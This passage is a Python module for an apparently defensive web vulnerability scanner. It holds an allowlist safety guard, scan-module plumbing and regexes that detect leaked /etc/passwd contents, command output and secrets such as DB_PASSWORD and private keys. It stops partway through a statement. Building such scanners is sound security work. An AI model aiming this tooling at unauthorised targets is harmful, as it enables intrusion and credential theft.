"""
modules/web_vapt_engine.py
==========================
AI Red Team Harness v5.0 — Advanced Web VAPT Engine

Production-grade defensive web application security assessment module.
Runs safe, non-destructive vulnerability detection against explicitly
allowlisted targets only. Includes all 20 advanced 2026 attack surface modules.

2026 Advanced Modules:
  - JWT Algorithm Confusion (PQ downgrade, public key HMAC)
  - WASM Memory Corruption (edge runtime JIT bugs)
  - CSS Container Query Injection (layout timing exfiltration)
  - HTTP/3 Stream Side Channels (QUIC stream isolation bypass)
  - Environment Variable Leakage (ESM import.meta.resolve)
  - Async Hooks Context Poisoning (AsyncLocalStorage cross-contamination)
  - HTTP Smuggling over WebTransport (QUIC stream pseudo-header injection)
  - MongoDB Aggregation Pipeline Injection ($accumulator, $function)
  - DOM Clobbering (sandbox BYPASS via id/name overrides)
  - Server-Timing Header Side Channels (sub-ms blind SQLi)
  - Web Crypto API Timing Attacks (subtle.encrypt/sign key recovery)
  - Import Map Override (SharedWorker cross-tab injection)
  - Cache Stamping (stale-while-revalidate CDN poisoning)
  - WebAuthn Passkey RP ID Confusion (subdomain credential reuse)
  - Deno Node Compat Deserialization (V8 sandbox escape)
  - HTTP/3 0-RTT Replay (anti-replay window bypass)
  - HPACK Dynamic Table Poisoning (HTTP/2 header compression abuse)
  - GraphQL N+1 Amplification (typename batching resolver exhaustion)
  - Prototype Pollution (structuredClone, MessageChannel, server-side)
  - Phar Deserialization (phar:// wrapper with GC exploitation)

Safety guarantees:
  - All targets validated against config/safety.yaml allowlist
  - No shell=True in any subprocess call
  - Rate-limited token-bucket request throttling
  - Per-request and per-tool timeouts enforced
  - Emergency kill-switch via asyncio.Event
  - No persistent modifications to target systems
  - Audit log written for every assessment

Supported checks:
  SQLi · XSS · IDOR · LFI · RFI · Command Injection · CSRF
  Auth Bypass · File Upload · Security Headers · TLS · CORS
  Sensitive Files · Debug Endpoints · SSRF · Open Redirect
  GraphQL · JWT · Prototype Pollution · WASM · CSS Injection
  HTTP/3 · WebTransport · Edge Runtime · ESM Leakage
  Async Hooks · MongoDB · DOM Clobbering · Server Timing
  Web Crypto · Import Maps · Cache Stamping · WebAuthn
  Deno Sandbox · 0-RTT Replay · HPACK Poisoning · N+1 Amplification

OWASP Top 10 2021 + 2026 mapped. CWE referenced. CVSS 4.0 scoring.

Authorised lab / owned-infrastructure use only.
Python: 3.11+
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import ipaddress
import json
import re
import struct
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from html.parser import HTMLParser
from pathlib import Path
from typing import Any, Callable
from urllib.parse import (
    parse_qs,
    urlencode,
    urljoin,
    urlparse,
    urlunparse,
)

import httpx
import yaml

from utils.logger import get_logger

logger = get_logger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

PROJECT_ROOT  = Path(__file__).parent.parent.resolve()
_VAPT_CFG     = PROJECT_ROOT / "config" / "web_vapt.yaml"
_SAFETY_CFG   = PROJECT_ROOT / "config" / "safety.yaml"
_LAB_MARKER   = PROJECT_ROOT / ".lab_mode_enabled"

_SQL_ERROR_RE = re.compile(
    r"SQL syntax.*MySQL|Warning.*mysql_|MySQLSyntaxErrorException"
    r"|valid MySQL result|check the manual that corresponds to your MySQL"
    r"|MySqlException|ORA-[0-9]{4}|Oracle error|Oracle.*Driver"
    r"|Warning.*oci_|Warning.*ora_"
    r"|Microsoft OLE DB Provider for SQL Server|ODBC SQL Server Driver"
    r"|SQLServer JDBC Driver|SqlException|SQLSTATE\["
    r"|PostgreSQL.*ERROR|Warning.*pg_|Npgsql\.|PG::SyntaxError"
    r"|PSQLException|SQLite.*Exception|System\.Data\.SQLite"
    r"|Warning.*sqlite_|Warning.*SQLite3::|\\[SQLITE_ERROR\\]"
    r"|Syntax error or access violation|Unclosed quotation mark"
    r"|You have an error in your SQL syntax|DB Error",
    re.I,
)

_LFI_INDICATOR_RE = re.compile(
    r"root:.*:0:0:|daemon:.*:1:1:|bin:.*:2:2:"     # /etc/passwd
    r"|\\[boot loader\\]|for 16-bit app support"    # win.ini
    r"|\\[extensions\\]",
    re.I,
)

_CMD_OUTPUT_RE = re.compile(
    r"\buid=\d+\(|\bgid=\d+\(|\bgroups=\d+"        # id output
    r"|\broot\b.*\b/root\b"                         # whoami root
    r"|Linux \S+ \d+\.\d+\.\d+"                     # uname -a
    r"|Microsoft Windows \[Version",                # Windows ver
    re.I,
)

_JWT_RE      = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{0,}")
_REDIRECT_RE = re.compile(r"<meta[^>]+http-equiv=['\"]refresh['\"][^>]+content=['\"][^'\"]*url=([^'\"]+)", re.I)

_SENSITIVE_CONTENT_RE = re.compile(
    r"DB_PASSWORD|DB_PASS|API_KEY|SECRET_KEY|AWS_SECRET"
    r"|private key|-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE|password\s*="
    r"|db_password\s*=|jdbc:[a-z]+://",
    re.I,
)

_PROTOTYPE_POLLUTION_SINKS = re.compile(
    r"structuredClone|Object\.assign|Object\.merge|jQuery\.extend"
    r"|lodash\.merge|_.set|JSON\.parse|MessageChannel|Worker",
    re.I,
)

_WASM_GC_RE = re.compile(
    r"WebAssembly\.Memory|wasm_memory|wasm_gc|v8_isolate|edge_runtime"
    r"|cloudflare_workers|deno|fastly_compute",
    re.I,
)

_CSS_EXFIL_RE = re.compile(
    r"@container\s|container-name|container-type|:has\(|@media\s",
    re.I,
)

_MONGODB_INJECTION_RE = re.compile(
    r"\$accumulator|\$function|\$_internalSql|\$where|\$regex|\$ne|\$gt",
    re.I,
)

_CACHE_POISON_RE = re.compile(
    r"stale-while-revalidate|stale-if-error|Cache-Control:\s*public",
    re.I,
)

_IMPORT_MAP_RE = re.compile(
    r"import\s*map|importmap|SharedWorker|module\s*url\s*override",
    re.I,
)

_SERVER_TIMING_RE = re.compile(
    r"Server-Timing|server-timing|timing-allow-origin",
    re.I,
)

# ---------------------------------------------------------------------------
# Enums and Data Classes
# ---------------------------------------------------------------------------

class WebRiskLevel(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH     = "HIGH"
    MEDIUM   = "MEDIUM"
    LOW      = "LOW"
    INFO     = "INFO"


_CVSS_DEFAULT: dict[WebRiskLevel, float] = {
    WebRiskLevel.CRITICAL: 9.0,
    WebRiskLevel.HIGH:     7.5,
    WebRiskLevel.MEDIUM:   5.0,
    WebRiskLevel.LOW:      2.5,
    WebRiskLevel.INFO:     0.0,
}

_CWE_MAP: dict[str, str] = {
    "sqli":                     "CWE-89",
    "xss":                      "CWE-79",
    "idor":                     "CWE-284",
    "lfi":                      "CWE-22",
    "rfi":                      "CWE-98",
    "command_injection":        "CWE-78",
    "csrf":                     "CWE-352",
    "auth":                     "CWE-287",
    "file_upload":              "CWE-434",
    "header":                   "CWE-693",
    "tls":                      "CWE-326",
    "cors":                     "CWE-942",
    "sensitive_file":           "CWE-538",
    "debug_endpoint":           "CWE-215",
    "ssrf":                     "CWE-918",
    "open_redirect":            "CWE-601",
    "graphql":                  "CWE-200",
    "jwt":                      "CWE-327",
    "prototype_pollution":      "CWE-1321",
    "jwt_algorithm_confusion":  "CWE-327",
    "wasm_memory_corruption":   "CWE-119",
    "css_container_injection":  "CWE-79",
    "http3_stream_side_channel":"CWE-203",
    "env_var_leakage":          "CWE-200",
    "async_hooks_poisoning":    "CWE-664",
    "http_smuggling_webtransport":"CWE-444",
    "mongodb_injection":        "CWE-943",
    "dom_clobbering":           "CWE-79",
    "server_timing_side_channel":"CWE-203",
    "web_crypto_timing":        "CWE-208",
    "import_map_override":      "CWE-345",
    "cache_stamping":           "CWE-525",
    "webauthn_rp_confusion":    "CWE-287",
    "deno_deserialization":     "CWE-502",
    "http3_0rtt_replay":        "CWE-294",
    "hpack_poisoning":          "CWE-345",
    "graphql_n_plus_one":       "CWE-400",
    "phar_deserialization":     "CWE-502",
}

_OWASP_MAP: dict[str, str] = {
    "sqli":                     "A03:2021 – Injection",
    "xss":                      "A03:2021 – Injection",
    "idor":                     "A01:2021 – Broken Access Control",
    "lfi":                      "A05:2021 – Security Misconfiguration",
    "rfi":                      "A05:2021 – Security Misconfiguration",
    "command_injection":        "A03:2021 – Injection",
    "csrf":                     "A01:2021 – Broken Access Control",
    "auth":                     "A07:2021 – Identification and Authentication Failures",
    "file_upload":              "A04:2021 – Insecure Design",
    "header":                   "A05:2021 – Security Misconfiguration",
    "tls":                      "A02:2021 – Cryptographic Failures",
    "cors":                     "A05:2021 – Security Misconfiguration",
    "sensitive_file":           "A05:2021 – Security Misconfiguration",
    "debug_endpoint":           "A05:2021 – Security Misconfiguration",
    "ssrf":                     "A10:2021 – SSRF",
    "open_redirect":            "A01:2021 – Broken Access Control",
    "graphql":                  "A05:2021 – Security Misconfiguration",
    "jwt":                      "A02:2021 – Cryptographic Failures",
    "prototype_pollution":      "A08:2021 – Software and Data Integrity Failures",
    "jwt_algorithm_confusion":  "A02:2026 – Post-Quantum Crypto Failures",
    "wasm_memory_corruption":   "A03:2026 – Edge Runtime Exploitation",
    "css_container_injection":  "A03:2021 – Injection",
    "http3_stream_side_channel":"A02:2021 – Cryptographic Failures",
    "env_var_leakage":          "A05:2021 – Security Misconfiguration",
    "async_hooks_poisoning":    "A07:2021 – Identification and Authentication Failures",
    "http_smuggling_webtransport":"A04:2026 – HTTP/3 Protocol Abuse",
    "mongodb_injection":        "A03:2021 – Injection",
    "dom_clobbering":           "A03:2021 – Injection",
    "server_timing_side_channel":"A02:2021 – Cryptographic Failures",
    "web_crypto_timing":        "A02:2021 – Cryptographic Failures",
    "import_map_override":      "A08:2021 – Software and Data Integrity Failures",
    "cache_stamping":           "A05:2021 – Security Misconfiguration",
    "webauthn_rp_confusion":    "A07:2021 – Identification and Authentication Failures",
    "deno_deserialization":     "A08:2021 – Software and Data Integrity Failures",
    "http3_0rtt_replay":        "A04:2021 – Insecure Design",
    "hpack_poisoning":          "A05:2021 – Security Misconfiguration",
    "graphql_n_plus_one":       "A04:2021 – Insecure Design",
    "phar_deserialization":     "A08:2021 – Software and Data Integrity Failures",
}


@dataclass
class WebFinding:
    id:          str
    title:       str
    severity:    WebRiskLevel
    confidence:  float          # 0.0 – 1.0 (raw engine confidence)
    endpoint:    str
    parameter:   str
    description: str
    evidence:    str
    remediation: str
    cwe:         str
    owasp:       str
    references:  list[str]
    cvss_score:  float = 0.0
    timestamp:   float = field(default_factory=time.time)
    module:      str = "general"
    proof_of_concept: str = ""

    # ── Validation agent fields ─────────────────────────────────────────────
    confidence_pct:         int   = 0      # 0-100 validated confidence
    validation_status:      str   = "potential"   # confirmed | potential | informational
    raw_request:            str   = ""
    raw_response_excerpt:   str   = ""
    reproduction_steps:     list[str] = field(default_factory=list)
    validation_logic:       str   = ""
    fp_checks_performed:    list[str] = field(default_factory=list)
    exploitability:         str   = ""
    exploit_status:         str   = "UNVERIFIED"  # CONFIRMED | UNVERIFIED
    comparison_result:      str   = ""             # diff between baseline and attack response

    def to_dict(self) -> dict[str, Any]:
        return {
            "id":                   self.id,
            "title":                self.title,
            "severity":             self.severity.value,
            "confidence":           round(self.confidence, 2),
            "confidence_pct":       self.confidence_pct,
            "cvss_score":           round(self.cvss_score, 1),
            "validation_status":    self.validation_status,
            "exploit_status":       self.exploit_status,
            "comparison_result":    self.comparison_result[:400],
            "endpoint":             self.endpoint,
            "parameter":            self.parameter,
            "description":          self.description,
            "evidence":             self.evidence[:500],
            "remediation":          self.remediation,
            "cwe":                  self.cwe,
            "owasp":                self.owasp,
            "references":           self.references,
            "timestamp":            self.timestamp,
            "module":               self.module,
            "proof_of_concept":     self.proof_of_concept[:300],
            "raw_request":          self.raw_request[:800],
            "raw_response_excerpt": self.raw_response_excerpt[:600],
            "reproduction_steps":   self.reproduction_steps,
            "validation_logic":     self.validation_logic[:400],
            "fp_checks_performed":  self.fp_checks_performed,
            "exploitability":       self.exploitability[:300],
        }


@dataclass
class WebScanSummary:
    total_findings:          int
    critical:                int
    high:                    int
    medium:                  int
    low:                     int
    info:                    int
    by_category:             dict[str, int]
    risk_score:              float   # 0 – 100
    scan_duration_seconds:   float
    urls_scanned:            int
    forms_tested:            int
    parameters_tested:       int
    advanced_module_findings: int = 0

    def to_dict(self) -> dict[str, Any]:
        return {
            "total_findings":        self.total_findings,
            "critical":              self.critical,
            "high":                  self.high,
            "medium":                self.medium,
            "low":                   self.low,
            "info":                  self.info,
            "by_category":           self.by_category,
            "risk_score":            round(self.risk_score, 1),
            "scan_duration_seconds": round(self.scan_duration_seconds, 1),
            "urls_scanned":          self.urls_scanned,
            "forms_tested":          self.forms_tested,
            "parameters_tested":     self.parameters_tested,
            "advanced_module_findings": self.advanced_module_findings,
        }


@dataclass
class AttackSurface:
    base_url:       str
    urls:           list[str]
    forms:          list[dict[str, Any]]
    parameters:     dict[str, list[str]]   # url → [param_names]
    cookies:        list[dict[str, Any]]
    headers:        dict[str, str]
    technologies:   list[str]
    js_files:       list[str]
    api_endpoints:  list[str]
    graphql_endpoints: list[str] = field(default_factory=list)
    websocket_endpoints: list[str] = field(default_factory=list)
    wasm_files:     list[str] = field(default_factory=list)
    service_workers: list[str] = field(default_factory=list)
    import_maps:    list[str] = field(default_factory=list)
    cache_headers:  dict[str, list[str]] = field(default_factory=dict)


@dataclass
class WebAssessmentResult:
    session_id:     str
    target_url:     str
    started_at:     float
    ended_at:       float
    findings:       list[WebFinding]
    summary:        WebScanSummary
    attack_surface: dict[str, Any]
    tool_outputs:   dict[str, Any]
    errors:         list[str]
    llm_result:     Any | None = None   # WebLLMResult when --web-vapt-llm is set

    def to_dict(self) -> dict[str, Any]:
        d = {
            "session_id":    self.session_id,
            "target_url":    self.target_url,
            "started_at":    self.started_at,
            "ended_at":      self.ended_at,
            "duration":      round(self.ended_at - self.started_at, 2),
            "findings":      [f.to_dict() for f in self.findings],
            "summary":       self.summary.to_dict(),
            "attack_surface": self.attack_surface,
            "tool_outputs":  self.tool_outputs,
            "errors":        self.errors,
        }
        if self.llm_result is not None:
            lr = self.llm_result
            d["llm_analysis"] = {
                "model":           getattr(lr, "model_used", ""),
                "iterations":      getattr(lr, "iterations_used", 0),
                "executive_brief": getattr(lr, "executive_brief", ""),
                "risk_rating":     getattr(lr, "risk_rating", ""),
                "attack_chains":   getattr(lr, "attack_chains", []),
                "error":           getattr(lr, "error", ""),
            }
        return d


# ---------------------------------------------------------------------------
# Rate Limiter (token bucket)
# ---------------------------------------------------------------------------

class _TokenBucketLimiter:
    """Thread-safe async token-bucket rate limiter."""

    def __init__(self, rate: float, burst: float | None = None) -> None:
        self._rate   = rate
        self._tokens = burst or rate
        self._max    = burst or rate
        self._last   = time.monotonic()
        self._lock   = asyncio.Lock()

    async def acquire(self) -> None:
        while True:
            async with self._lock:
                now     = time.monotonic()
                elapsed = now - self._last
                self._tokens = min(self._max, self._tokens + elapsed * self._rate)
                self._last   = now
                if self._tokens >= 1.0:
                    self._tokens -= 1.0
                    return
                wait = (1.0 - self._tokens) / self._rate
            await asyncio.sleep(wait)


# ---------------------------------------------------------------------------
# HTML Parser helpers
# ---------------------------------------------------------------------------

class _LinkFormExtractor(HTMLParser):
    """Extracts <a href>, <form>, <script>, <link>, <meta>, and import-map tags."""

    def __init__(self) -> None:
        super().__init__()
        self.links: list[str]             = []
        self.forms: list[dict[str, Any]]  = []
        self.scripts: list[str]           = []
        self.wasm_files: list[str]        = []
        self.service_workers: list[str]   = []
        self.import_maps: list[str]       = []
        self.meta_tags: dict[str, str]    = {}
        self._cur: dict[str, Any] | None  = None
        self._in_import_map: bool         = False
        self._import_map_content: str     = ""

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        d = {k: (v or "") for k, v in attrs}
        if tag == "a" and d.get("href"):
            self.links.append(d["href"])
        elif tag == "script" and d.get("src"):
            src = d["src"]
            self.scripts.append(src)
            if ".wasm" in src.lower():
                self.wasm_files.append(src)
        elif tag == "script" and d.get("type") == "importmap":
            self._in_import_map = True
            self._import_map_content = ""
        elif tag == "script" and d.get("type") == "module":
            src = d.get("src", "")
            if src:
                self.scripts.append(src)
        elif tag == "form":
            self._cur = {
                "action": d.get("action", ""),
                "method": d.get("method", "get").upper(),
                "enctype": d.get("enctype", "application/x-www-form-urlencoded"),
                "inputs": [],
            }
        elif tag in ("input", "textarea", "select") and self._cur is not None:
            name = d.get("name", "")
            if name:
                self._cur["inputs"].append({
                    "name":  name,
                    "type":  d.get("type", "text"),
                    "value": d.get("value", ""),
                })
        elif tag == "meta":
            name_attr = d.get("name", "")
            content   = d.get("content", "")
            if name_attr and content:
                self.meta_tags[name_attr.lower()] = content
        elif tag == "link":
            rel = d.get("rel", "").lower()
            href = d.get("href", "")
            if "service-worker" in rel or "serviceworker" in rel:
                self.service_workers.append(href)

    def handle_data(self, data: str) -> None:
        if self._in_import_map:
            self._import_map_content += data

    def handle_endtag(self, tag: str) -> None:
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None
        elif tag == "script" and self._in_import_map:
            self._in_import_map = False
            if self._import_map_content.strip():
                self.import_maps.append(self._import_map_content.strip())


# ---------------------------------------------------------------------------
# Safety Guard
# ---------------------------------------------------------------------------

class WebSafetyGuard:
    """
    Enforces target allowlist from config/safety.yaml before any scan.
    Raises ValueError for any non-allowlisted or otherwise forbidden target.
    """

    def __init__(self, config_path: Path = _SAFETY_CFG) -> None:
        self._allowed_prefixes: list[str] = []
        self._require_lab_marker = True
        self._max_duration       = 3600
        self._load(config_path)

    def _load(self, path: Path) -> None:
        if not path.exists():
            logger.warning("safety.yaml not found — using localhost-only defaults")
            self._allowed_prefixes = ["http://localhost", "https://localhost",
                                      "http://127.0.0.1", "https://127.0.0.1"]
            return
        try:
            data = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
            wv   = data.get("web_vapt", {})
            self._allowed_prefixes   = wv.get("allowed_urls", ["http://localhost"])
            self._require_lab_marker = wv.get("require_lab_marker", True)
            self._max_duration       = wv.get("max_scan_duration_seconds", 3600)
        except Exception as exc:
            raise RuntimeError(f"Failed to load safety.yaml: {exc}") from exc

    def validate(self, url: str) -> None:
        """Raise ValueError if *url* is not in the allowlist."""
        if self._require_lab_marker and not _LAB_MARKER.exists():
            raise ValueError(
                "Lab marker not found. Run: python start_assessment.py --create-lab-marker"
            )
        parsed = urlparse(url)
        target = f"{parsed.scheme}://{parsed.netloc}"
        if not any(target.startswith(p) for p in self._allowed_prefixes):
            raise ValueError(
                f"Target '{target}' is not in the web VAPT allowlist "
                f"(config/safety.yaml → web_vapt.allowed_urls). "
                f"Add it explicitly to authorise testing."
            )
        # Block cloud metadata endpoints
        host = parsed.hostname or ""
        try:
            addr = ipaddress.ip_address(host)
            blocked = [
                ipaddress.ip_network("169.254.169.254/32"),
                ipaddress.ip_network("100.100.100.200/32"),
            ]
            if any(addr in net for net in blocked):
                raise ValueError(f"Target resolves to a blocked cloud metadata address: {host}")
        except ValueError as exc:
            if "blocked cloud metadata" in str(exc):
                raise
        logger.info("Safety validation passed for target: %s", url)


# ---------------------------------------------------------------------------
# Web VAPT Engine
# ---------------------------------------------------------------------------

class WebVAPTEngine:
    """
    Async web application vulnerability assessment engine v5.0
    with complete 2026 advanced module support.

    Usage::

        engine = WebVAPTEngine()
        result = await engine.assess("http://localhost:3333/")
        report = await engine.generate_report(result)
    """

    def __init__(
        self,
        config_path:    Path                   = _VAPT_CFG,
        safety_path:    Path                   = _SAFETY_CFG,
        kill_switch:    asyncio.Event | None   = None,
        cookies:        str | None             = None,
        auth:           tuple[str, str] | None = None,
        module_filter:  list[str] | None       = None,
        extra_headers:  dict[str, str] | None  = None,
        burp_seed:      Any | None             = None,
    ) -> None:
        self._cfg         = self._load_config(config_path)
        self._safety      = WebSafetyGuard(safety_path)
        self._kill        = kill_switch or asyncio.Event()
        self._cookies     = cookies
        self._auth        = auth
        self._module_filter = [m.strip().lower() for m in module_filter] if module_filter else None
        self._extra_headers = extra_headers or {}
        self._burp_seed   = burp_seed          # ParsedBurpRequest | None
        rl                = self._cfg.get("rate_limiting", {})
        self._limiter     = _TokenBucketLimiter(
            rate  = rl.get("requests_per_second", 10.0),
            burst = rl.get("burst_size", 20),
        )
        conc              = self._cfg.get("concurrency", {})
        self._sem         = asyncio.Semaphore(conc.get("max_parallel_scans", 8))
        to                = self._cfg.get("timeouts", {})
        self._http_timeout   = to.get("http_request_seconds", 15.0)
        self._tool_timeout   = to.get("tool_execution_seconds", 120)
        self._timing_thresh  = to.get("timing_probe_threshold", 4.5)
        self._connect_timeout= to.get("connect_timeout_seconds", 5.0)
        self._session_id     = uuid.uuid4().hex[:8]
        self._errors: list[str] = []
        # Track advanced module findings count
        self._advanced_module_findings = 0

    # ── Config ────────────────────────────────────────────────────────────────

    @staticmethod
    def _load_config(path: Path) -> dict[str, Any]:
        if not path.exists():
            logger.warning("web_vapt.yaml not found — using built-in defaults")
            return {}
        try:
            return yaml.safe_load(path.read_text(encoding="utf-8")) or {}
        except Exception as exc:
            logger.warning("Failed to load web_vapt.yaml: %s — using defaults", exc)
            return {}

    def _module_enabled(self, name: str) -> bool:
        if self._module_filter is not None and name.lower() not in self._module_filter:
            return False
        return self._cfg.get("modules", {}).get(name, {}).get("enabled", True)

    def _max_payloads(self, name: str, default: int = 20) -> int:
        return self._cfg.get("modules", {}).get(name, {}).get("max_payloads", default)

    def _load_payloads(self, key: str) -> list[str]:
        rel = self._cfg.get("payloads", {}).get(key, f"payloads/web/{key}.txt")
        path = PROJECT_ROOT / rel
        if not path.exists():
            logger.warning("Payload file not found: %s", path)
            return []
        lines = []
        for line in path.read_text(encoding="utf-8").splitlines():
            s = line.strip()
            if s and not s.startswith("#"):
                lines.append(s)
        return lines

    # ── HTTP helpers ─────────────────────────────────────────────────────────

    def _make_client(self) -> httpx.AsyncClient:
        cfg = self._cfg.get("crawl", {})
        # Start with Burp-sourced headers (real browser data), then apply overrides
        headers: dict[str, str] = {**self._extra_headers}
        # Config user-agent takes precedence over Burp's if explicitly set
        headers["User-Agent"] = cfg.get("user_agent") or headers.get("user-agent", "AI-RedTeam-VAPT/5.0")
        if self._cookies:
            headers["Cookie"] = self._cookies
        return httpx.AsyncClient(
            follow_redirects  = cfg.get("follow_redirects", True),
            timeout           = httpx.Timeout(self._http_timeout, connect=self._connect_timeout),
            headers           = headers,
            auth              = self._auth,
            verify            = False,  # lab targets may use self-signed certs
        )

    async def _get(
        self,
        client:  httpx.AsyncClient,
        url:     str,
        params:  dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
    ) -> httpx.Response | None:
        if self._kill.is_set():
            return None
        await self._limiter.acquire()
        try:
            return await client.get(url, params=params, headers=headers)
        except Exception as exc:
            logger.debug("GET %s failed: %s", url, exc)
            return None

    async def _post(
        self,
        client:  httpx.AsyncClient,
        url:     str,
        data:    dict[str, str] | None = None,
        json_:   dict[str, Any] | None = None,
        headers: dict[str, str] | None = None,
    ) -> httpx.Response | None:
        if self._kill.is_set():
            return None
        await self._limiter.acquire()
        try:
            return await client.post(url, data=data, json=json_, headers=headers)
        except Exception as exc:
            logger.debug("POST %s failed: %s", url, exc)
            return None

    # ── Finding factory ───────────────────────────────────────────────────────

    def _finding(
        self,
        category:    str,
        title:       str,
        severity:    WebRiskLevel,
        confidence:  float,
        endpoint:    str,
        parameter:   str,
        description: str,
        evidence:    str,
        remediation: str,
        references:  list[str] | None = None,
        cvss_score:  float | None     = None,
        module:      str = "general",
        poc:         str = "",
    ) -> WebFinding:
        uid = hashlib.md5(
            f"{title}{endpoint}{parameter}".encode(), usedforsecurity=False
        ).hexdigest()[:8].upper()
        return WebFinding(
            id          = f"WEB-{uid}",
            title       = title,
            severity    = severity,
            confidence  = min(1.0, max(0.0, confidence)),
            endpoint    = endpoint,
            parameter   = parameter,
            description = description,
            evidence    = evidence[:500],
            remediation = remediation,
            cwe         = _CWE_MAP.get(category, "CWE-0"),
            owasp       = _OWASP_MAP.get(category, "OWASP Top 10"),
            references  = references or [],
            cvss_score  = cvss_score if cvss_score is not None else _CVSS_DEFAULT[severity],
            module      = module,
            proof_of_concept = poc[:300],
        )

    def _add_advanced_finding(self, finding: WebFinding) -> WebFinding:
        """Mark a finding as coming from an advanced 2026 module."""
        self._advanced_module_findings += 1
        return finding

    # ── Kill-switch guard ─────────────────────────────────────────────────────

    def _check_kill(self) -> bool:
        if self._kill.is_set():
            logger.warning("Kill-switch triggered — aborting assessment")
            return True
        return False

    # ── Burp request seed ─────────────────────────────────────────────────────

    def _merge_burp_seed(self, surface: "AttackSurface") -> None:
        """
        Inject data from a parsed Burp request file into *surface* so that
        all scan modules test the exact endpoint, parameters, headers, and
        form data captured in the proxy.
        """
        seed = self._burp_seed
        if seed is None:
            return

        # Add the captured URL to the surface URL list
        if seed.url not in surface.urls:
            surface.urls.append(seed.url)

        # Merge URL query-string params
        if seed.query_params:
            existing = surface.parameters.get(seed.url, [])
            for k in seed.query_params:
                if k not in existing:
                    existing.append(k)
            surface.parameters[seed.url] = existing

        # Build a synthetic form from all request parameters so modules
        # like SQLi, XSS, CSRF, IDOR, LFI, etc. iterate over them
        all_params = {**seed.query_params, **seed.body_params}
        if all_params:
            synthetic = seed.as_form_dict()
            # Avoid a duplicate if we already seeded from a previous call
            if not any(f.get("_source") == "burp_request" for f in surface.forms):
                surface.forms.append(synthetic)
            logger.info(
                "Burp seed: injected form with %d parameter(s) → %s",
                len(all_params), seed.url,
            )

        # Merge Burp headers into the surface header map so header-analysis
        # modules see the real browser headers
        for k, v in seed.headers.items():
            surface.headers.setdefault(k, v)

        # Inject cookie info so cookie-security checks have real data
        if seed.cookie_header:
            for pair in seed.cookie_header.split(";"):
                pair = pair.strip()
                if "=" in pair:
                    name, _, val = pair.partition("=")
                    name = name.strip()
                    if name and not any(c["name"] == name for c in surface.cookies):
                        surface.cookies.append({
                            "name":     name,
                            "value":    (val[:20] + "...") if len(val) > 20 else val,
                            "httponly": False,
                            "secure":   seed.scheme == "https",
                            "samesite": "unknown",
                            "_source":  "burp_request",
                        })

    # =========================================================================
    # Main assess() entry point
    # =========================================================================

    async def assess(self, target_url: str) -> WebAssessmentResult:
        """
        Run a full web VAPT assessment against *target_url*.

        Safety checks (allowlist, lab marker) are enforced before any
        network traffic is sent.  Returns a WebAssessmentResult even on
        partial failure; errors are collected in result.errors.
        """
        self._safety.validate(target_url)   # raises ValueError if not allowed

        started_at   = time.time()
        tool_outputs: dict[str, Any] = {}
        self._advanced_module_findings = 0

        logger.info(
            "=== WEB VAPT SESSION %s START | target=%s ===",
            self._session_id, target_url,
        )

        # ── Phase 1: Attack surface discovery ─────────────────────────────
        surface = await self.discover_attack_surface(target_url)

        # ── Phase 1b: Merge Burp request seed (if provided) ───────────────
        if self._burp_seed is not None:
            self._merge_burp_seed(surface)

        logger.info(
            "Attack surface: %d URLs, %d forms, %d parameters, %d JS, %d WASM",
            len(surface.urls), len(surface.forms),
            sum(len(v) for v in surface.parameters.values()),
            len(surface.js_files), len(surface.wasm_files),
        )

        # ── Phase 2: Run all enabled scan modules concurrently ────────────
        scan_tasks: dict[str, asyncio.Task[list[WebFinding]]] = {}

        async def _guarded(name: str, coro: Any) -> list[WebFinding]:
            if self._check_kill():
                return []
            async with self._sem:
                try:
                    return await coro
                except Exception as exc:
                    self._errors.append(f"{name}: {exc}")
                    logger.error("Scan module %s failed: %s", name, exc)
                    return []

        module_map: dict[str, Any] = {
            # Classic modules
            "sqli":               self.run_sqli_tests(surface),
            "xss":                self.run_xss_tests(surface),
            "idor":               self.run_idor_tests(surface),
            "lfi":                self.run_lfi_tests(surface),
            "rfi":                self.run_rfi_tests(surface),
            "command_injection":  self.run_command_injection_tests(surface),
            "csrf":               self.run_csrf_tests(surface),
            "auth":               self.run_auth_tests(surface),
            "file_upload":        self.run_file_upload_tests(surface),
            "security_headers":   self.run_header_analysis(surface),
            "tls":                self.run_tls_analysis(target_url),
            "cors":               self.run_cors_analysis(surface),
            "sensitive_files":    self.run_sensitive_file_scan(surface),
            "debug_endpoints":    self.run_debug_endpoint_scan(surface),
            "ssrf":               self.run_ssrf_tests(surface),
            "open_redirect":      self.run_open_redirect_tests(surface),
            "graphql":            self.run_graphql_analysis(surface),
            "jwt":                self.run_jwt_analysis(surface),
            "prototype_pollution":self.run_prototype_pollution_tests(surface),

            # Advanced 2026 modules
            "jwt_algorithm_confusion":  self.run_jwt_algorithm_confusion_tests(surface),
            "wasm_memory_corruption":   self.run_wasm_memory_corruption_tests(surface),
            "css_container_injection":  self.run_css_container_injection_tests(surface),
            "http3_stream_side_channel":self.run_http3_stream_side_channel_tests(surface),
            "env_var_leakage":          self.run_env_var_leakage_tests(surface),
            "async_hooks_poisoning":    self.run_async_hooks_poisoning_tests(surface),
            "http_smuggling_webtransport":self.run_http_smuggling_webtransport_tests(surface),
            "mongodb_injection":        self.run_mongodb_aggregation_injection_tests(surface),
            "dom_clobbering":           self.run_dom_clobbering_tests(surface),
            "server_timing_side_channel":self.run_server_timing_side_channel_tests(surface),
            "web_crypto_timing":        self.run_web_crypto_timing_tests(surface),
            "import_map_override":      self.run_import_map_override_tests(surface),
            "cache_stamping":           self.run_cache_stamping_tests(surface),
            "webauthn_rp_confusion":    self.run_webauthn_rp_confusion_tests(surface),
            "deno_deserialization":     self.run_deno_deserialization_tests(surface),
            "http3_0rtt_replay":        self.run_http3_0rtt_replay_tests(target_url),
            "hpack_poisoning":          self.run_hpack_poisoning_tests(surface),
            "graphql_n_plus_one":       self.run_graphql_n_plus_one_tests(surface),
            "phar_deserialization":     self.run_phar_deserialization_tests(surface),
        }

        active = {
